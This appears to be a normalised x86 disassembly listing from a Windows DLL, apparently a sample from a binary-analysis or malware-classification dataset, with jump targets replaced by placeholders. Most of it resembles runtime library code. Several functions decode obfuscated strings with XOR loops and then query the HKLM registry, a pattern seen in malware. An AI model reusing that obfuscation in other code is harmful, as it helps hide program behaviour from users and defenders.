xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_10057f6e
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_100532c3
pop ecx
test eax eax
jne r-xdata
call sub_10017e52
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10057f6e
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_100109dd
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_10005a0c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1000932c
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_10022c7d
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_10067d3a
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_10035d06
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_10067d3a
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_10069c0f
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_10022c7d
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1003cbb0
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_10035d06
pop ecx
inc esi
push esi
push eax
call sub_10067d3a
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_10035d06
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_10022c7d
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
sub_100094d8
push 0x28
mov eax sub_1008552b
call sub_100624bc
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_10003a38
mov [ esi ] r--data
jmp r-xdata
sub_1000956d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
add esi 0x2
sub_1000959d
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x78 ] eax
inc edi
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x70 ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
push ebx
push esi
push 0x2
mov [ ebp - 0x54 ] edx
pop esi
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
xor eax eax
jmp r-xdata
add edx esi
jmp r-xdata
cmp eax 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_10001e8b
leave
retn
movzx eax [ edx ]
cmp eax 0x20
je r-xdata
cmp eax 0xa
je r-xdata
cmp eax 0xd
jne r-xdata
push 0x30
pop ebx
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_10009cad ]
movzx eax [ edx ]
add edx esi
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x5c ] edi
cmp cx 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
jbe r-xdata
mov [ ebp - 0x5c ] edi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x6c ] edi
jne r-xdata
add eax 0xffffffd0
mov [ ebp - 0x6c ] edi
cmp ax 0x9
ja r-xdata
lea ecx [ edx - 0x4 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cx 0x8
ja r-xdata
mov [ ebp - 0x60 ] edi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cx 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] edi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x78 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
cmp eax ecx
je r-xdata
cmp ax bx
jae r-xdata
cmp ax bx
jae r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp ax bx
je r-xdata
cmp ax bx
jmp r-xdata
push 0xa
pop ecx
sub edx esi
sub eax 0x2b
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp ax bx
jae r-xdata
mov [ ebp - 0x70 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
sub eax 0x2b
je r-xdata
push 0x5
cmp eax 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp eax ebx
je r-xdata
cmp ax 0x39
ja r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
movsx ecx [ ecx ]
movzx eax ax
cmp eax ecx
je r-xdata
cmp ax 0x39
ja r-xdata
movzx eax ax
jmp r-xdata
cmp ax bx
je r-xdata
pop ecx
sub edx esi
jmp r-xdata
push 0x7
jmp r-xdata
sub eax esi
je r-xdata
movzx eax [ edx ]
add edx esi
add eax 0xffffffcf
cmp ax 0x8
jbe r-xdata
jne r-xdata
sub eax esi
je r-xdata
cmp ax 0x39
ja r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
mov eax [ ebp - 0x58 ]
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
mov ecx esi
jmp r-xdata
sub eax esi
je r-xdata
sub edx esi
push 0xb
jmp r-xdata
cmp eax 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx edi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp eax 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
movzx eax [ edx ]
add edx esi
jmp r-xdata
or [ ebp - 0x64 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
sub edx esi
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x68 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movzx edi ax
lea ecx [ ecx + edi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x58 ]
dec eax
inc [ ebp - 0x50 ]
jmp r-xdata
inc [ ebp - 0x9 ]
mov ecx esi
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax ebx
je r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
inc [ ebp - 0x4c ]
sub al bl
inc [ ebp - 0x58 ]
mov [ ecx ] al
jmp r-xdata
cmp eax 0x2d
je r-xdata
movzx eax [ edx ]
add edx esi
inc [ ebp - 0x4c ]
mov ecx [ ebp - 0x58 ]
sub al bl
inc [ ebp - 0x58 ]
dec [ ebp - 0x50 ]
mov [ ecx ] al
cmp ax bx
jae r-xdata
mov ecx 0x1451
movzx eax [ edx ]
add edx esi
dec eax
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp eax 0x43
jle r-xdata
movzx eax [ edx ]
add edx esi
jmp r-xdata
cmp ax 0x39
ja r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10056878
mov eax [ ebp - 0x68 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x64 ] edx
jge r-xdata
cmp eax 0x45
jle r-xdata
movzx eax [ edx ]
add edx esi
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
add eax 0xffffff9c
cmp eax edi
ja r-xdata
cmp [ ebp - 0x6c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x70 ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x7c ]
or eax [ ebp - 0x74 ]
mov [ edi + 0x2 ] esi
pop esi
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x70 ]
mov [ edi ] cx
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x70 ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x78 ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x78 ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x4c ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x64 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x5c ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x64 ]
dec [ ebp - 0x5c ]
cmp [ ebp - 0x5c ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x6c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x64 ]
mov edx [ ebp - 0x5c ]
add eax eax
mov [ ebp - 0x68 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x50 ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x68 ]
cmp [ ebp - 0x68 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x50 ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x6c ]
mov edx [ ebp - 0x60 ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x50 ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x58 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x58 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x4c ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x4c ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_10009cdd
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_10009d10
push ebp
mov ebp esp
push 0xffffffff
push sub_10088449
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ r--data ]
mov esi ecx
mov [ ebp - 0xd4 ] eax
xor ebx ebx
xor cl cl
xor eax eax
mov dl [ eax + edi ]
xor dl cl
xor dl 0x51
inc cl
mov [ ebp + eax - 0x1c ] dl
movzx eax cl
cmp eax 0x8
jb r-xdata
lea eax [ ebp - 0xd0 ]
push eax
lea edi [ ebp - 0x1c ]
mov ecx esi
mov [ ebp - 0x14 ] bl
call sub_1006a720
mov edi [ r--data ]
add esp 0x4
xor cl cl
xor eax eax
lea esp [ esp ]
mov dl [ eax + edi ]
xor dl cl
xor dl 0x32
inc cl
mov [ ebp + eax - 0xcc ] dl
movzx eax cl
cmp eax 0x3
jb r-xdata
lea eax [ ebp - 0xcc ]
mov [ ebp - 0xc9 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push ebx
lea eax [ ebp - 0xcc ]
push eax
mov ecx esi
call sub_100075f0
cmp eax 0xffffffff
je r-xdata
push 0x1
push ebx
lea eax [ ebp - 0xc8 ]
push eax
mov ecx esi
mov [ ebp - 0xc8 ] 0x2f
call sub_100075f0
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push 0xffffffff
add eax 0x3
push eax
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx esi
call sub_10062d50
push eax
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_10021bf0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x24 ] 0x10
jb r-xdata
push edi
push ebx
lea ecx [ ebp - 0xa8 ]
push ecx
mov ecx esi
call sub_10062d50
push 0xffffffff
inc edi
push edi
lea edx [ ebp - 0x38 ]
push edx
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10062d50
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10021bf0
cmp [ ebp - 0x24 ] 0x10
jb r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x38 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0x78 ] 0xf
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x8c ] bl
push 0x1
push ebx
lea ecx [ ebp - 0xc8 ]
push ecx
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0xc8 ] 0x3a
call sub_100075f0
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x38 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0xffffffff
lea edx [ edi + 0x1 ]
push edx
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0xa8 ]
call sub_10062d50
push eax
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0x4
call sub_10021bf0
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x24 ] 0x10
jb r-xdata
push 0x2
push r--data
lea ecx [ ebp - 0x8c ]
call sub_10037e00
jmp r-xdata
push edi
push ebx
lea edx [ ebp - 0x38 ]
push edx
lea ecx [ ebp - 0xa8 ]
call sub_10062d50
push eax
lea ecx [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] 0x5
call sub_10021bf0
cmp [ ebp - 0x24 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x38 ]
push ecx
call sub_100187af
add esp 0x4
mov eax 0xf
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x70 ] bl
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x7
push ecx
mov edi esi
mov [ ebp - 0xc8 ] 0x2f
call sub_10019190
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x38 ]
push eax
call sub_100187af
add esp 0x4
lea edi [ eax + 0x1 ]
push edi
push ebx
lea edx [ ebp - 0x38 ]
push edx
mov ecx esi
call sub_10062d50
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x8
call sub_10021bf0
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x24 ] 0x10
jb r-xdata
push eax
push ebx
push esi
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x44 ] 0x1
mov [ ebp - 0x54 ] 0x2f
call sub_1004efe0
mov esi 0x10
jmp r-xdata
push 0xffffffff
push edi
lea ecx [ ebp - 0xc4 ]
push ecx
mov ecx esi
call sub_10062d50
push eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x9
call sub_10021bf0
mov esi 0x10
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0xb0 ] esi
jb r-xdata
mov eax [ ebp - 0x38 ]
push eax
call sub_100187af
add esp 0x4
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0xd4 ]
lea ecx [ ebp - 0xa8 ]
push ecx
lea edx [ ebp - 0xd0 ]
push edx
push eax
lea ecx [ ebp - 0x54 ]
lea edx [ ebp - 0x8c ]
call sub_1003bdb0
add esp 0x10
cmp [ ebp - 0x5c ] esi
jb r-xdata
mov edx [ ebp - 0xc4 ]
push edx
call sub_100187af
add esp 0x4
mov edi 0xf
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x70 ] bl
cmp [ ebp - 0x40 ] esi
jb r-xdata
mov ecx [ ebp - 0x70 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
cmp [ ebp - 0x78 ] esi
jb r-xdata
mov edx [ ebp - 0x54 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0x78 ] edi
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x8c ] bl
cmp [ ebp - 0x94 ] esi
jb r-xdata
mov eax [ ebp - 0x8c ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov ecx [ ebp - 0xa8 ]
push ecx
call sub_100187af
add esp 0x4
sub_1000a0b0
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffb2
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x3c
jb r-xdata
lea ecx [ ebp - 0x84 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0x80 ]
push edx
push 0x80000002
mov [ ebp - 0x8 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x84 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_10001e8b
mov esp ebp
pop ebp
retn
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1000a150
push ebp
mov ebp esp
push 0xffffffff
push sub_10089c21
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x2b4 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
xor ebx ebx
cmp [ esi + 0xc ] ebx
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax 0x80
call sub_10045930
xor esi esi
xor ecx ecx
mov eax edx
mov [ ebp - 0x280 ] 0x7
mov [ ebp - 0x284 ] esi
mov [ ebp - 0x294 ] cx
lea edx [ eax + 0x2 ]
jmp r-xdata
cmp [ esi + 0x384 ] ebx
jne r-xdata
lea edx [ ebp - 0x110 ]
mov eax 0x11c
call sub_10045930
xor ecx ecx
mov eax edx
mov [ ebp - 0x280 ] 0x7
mov [ ebp - 0x284 ] ebx
mov [ ebp - 0x294 ] cx
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
push 0x104
mov eax 0x1
lea ecx [ ebp - 0x278 ]
push ebx
push ecx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x40 ] eax
call sub_1007f940
add esp 0xc
lea edx [ ebp - 0x278 ]
push edx
push 0x104
call [ GetCurrentDirectoryA@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x2b4 ]
push eax
push ecx
lea edx [ ebp - 0x278 ]
push edx
lea edi [ esi + 0x50 ]
push esi
mov ebx edi
call sub_10018710
